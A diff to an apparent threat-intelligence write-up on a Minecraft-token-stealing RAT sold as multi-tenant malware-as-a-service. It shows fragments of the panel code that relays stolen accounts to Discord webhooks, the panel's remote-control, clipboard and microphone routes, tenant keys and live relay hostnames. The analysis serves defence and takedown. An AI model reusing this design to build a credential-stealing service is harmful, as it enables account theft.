@@ -133,6 +133,104 @@ The chain is not the weak point for takedown, but it is the strongest attributio
 has, because the same wallet has been signing config updates continuously since October and the
 older one since December.
 
+## Inside the panel (from the slot 7 jar)
+
+The slot 7 payload is not only a client. It contains the **panel's own Spring MVC backend**,
+which means the operator develops the client and the server in one project and the server classes
+end up shipped to victims. Reading them tells us exactly how the service works.
+
+`com.example.rat.ThinReportController` is the server side of `/api/report`, the endpoint the Cloudflare
+worker relays to. Its logic:
+
+```java
+String dk = (name + "|" + uuid + "|" + token).trim();          // dedupe key
+if (prev != null && now - prev < 90000L) return "{"ok":true,"dup":true}";
+List<String> candidates = this.resolveWebhooks(key);
+// keep only https://discord.com/api/webhooks/ or discordapp.com
+// skip webhooks marked dead in the last 600000 ms
+for (String w : candidates) { int c = this.sendEmbed(w, name, uuid, token, receiver, key); ... }
+```
+
+So the stolen Minecraft account is not just stored, it is **pushed to a Discord webhook** as an
+embed. That is the actual delivery mechanism of the whole product, and it is why the relay answers
+`{"ok":true,"relayed":true}`.
+
+`resolveWebhooks` shows the business model:
+
+```java
+String clean = key.replace("=", "");
+if (clean.startsWith("30e3267e-d80c-4a8f-84e2-bb475930a37c")) clean = "30e3267e-...";
+Optional<AppSettings> opt = this.settingsRepo.findById(UUID.fromString(clean));
+JsonNode root = JSON.readTree(opt.get().getSettingsJson());
+this.collectDiscordTopLevel(root, out);      // root.Discord.items[] where id == "Webhook"
+```
+
+The `key` the malware beacons with is a **customer UUID**, a row in the panel's settings table.
+Each customer has their own settings JSON and their own Discord webhook. This is multi-tenant
+malware-as-a-service, not a single attacker with one drop box.
+
+Two keys matter:
+
+```
+30e3267e-d80c-4a8f-84e2-bb475930a37c   prefix-matched special case in the code, and the key
+                                       stage 2a exempts from the spam component. This is the
+                                       operator's own tenant.
+5af99dfc-41c6-451e-b4cd-22c99b9a4e9c   the key baked into the sample I analysed, padded with
+                                       "=" characters to a fixed length. Whoever distributed
+                                       this build is a separate tenant from the operator.
+```
+
+I checked `GET /api/premium-status?id=5af99dfc-...` and it returned `{"premium":false}`, but that
+proves nothing on its own: the same endpoint returns `false` for a made-up all-zero id, so it
+cannot distinguish "free tier customer" from "no such customer". I am noting the key as an
+identifier to hand over, not as a confirmed account.
+
+Other server routes in the same jar, which also confirm marketing claims I could not previously
+see in client code:
+
+```
+@RequestMapping("/api/report")   /api/client   /api/revoke
+POST /control/keyPress  /control/keyRelease  /control/mousePress  /control/mouseMove  /control/mouseRelease
+POST /clipboard/upload  /clipboard/set  /clipboard/clear
+POST /mic/upload  /mic/status      GET /mic/merge  /mic/list  /mic/listeners
+GET  /update.ps1   (produces text)          <- the panel serves a PowerShell updater
+GET  /monitors  /status  /settings  /version  /update
+```
+
+The `/control/*` routes are the "Remote Mouse & Keyboard Control" from the landing page, and
+`/update.ps1` is a Windows-only self-update path.
+
+## Distribution and detection gaps
+
+None of the four payloads are in MalwareBazaar:
+
+```
+e1d18e83...  not in MalwareBazaar
+3dbf58b8...  not in MalwareBazaar
+a74299e9...  not in MalwareBazaar
+cf55438b...  not in MalwareBazaar
+```
+
+For a campaign that has been running since February and is actively marketed, that is a real gap.
+It matches what the operator said on 2026-10-18 ("new builds come through clean on both VirusTotal
+and Ratter Scanner") - they are testing against the public feeds, and the samples are not reaching
+them. Submitting these hashes to MalwareBazaar and ThreatFox is worth doing from an account that
+is entitled to submit malware; that is a task for whoever holds such an account, not something I
+can do from here.
+
+## A third Cloudflare Worker
+
+The code references three Workers on the same account, and I had only found two:
+
+```
+relay-3f9c71.kartohaantoha36-6a9.workers.dev      primary, live
+relay-mirror.kartohaantoha36-6a9.workers.dev      mirror, live, serves the identical config v47
+telemetry-relay.kartohaantoha36-6a9.workers.dev   dead, Cloudflare 403/530
+```
+
+`relay-mirror` is a straight mirror of the same slot map, so killing `relay-3f9c71` alone would
+not stop delivery.
+
 ## Attribution leads
 
 What I have, ranked by how much I trust it:
